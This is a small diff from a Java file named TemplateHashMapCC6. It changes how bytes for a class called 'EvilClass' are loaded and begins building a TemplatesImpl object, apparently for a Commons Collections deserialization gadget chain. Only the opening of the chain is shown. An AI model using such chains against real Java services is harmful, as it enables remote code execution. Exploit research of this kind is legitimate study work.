@@ -10,7 +10,7 @@ import java.util.Map;
 
 public class TemplateHashMapCC6 {
     public static void main(String[] args) throws Exception{
-        byte[][] bytes = Util.getExpClassFileBytes("EvilClass");
+        byte[] bytes = Util.getExpClassFileBytes("EvilClass");
 
         TemplatesImpl templates = new TemplatesImpl();
         Util.setValue(templates, "_name", "v");
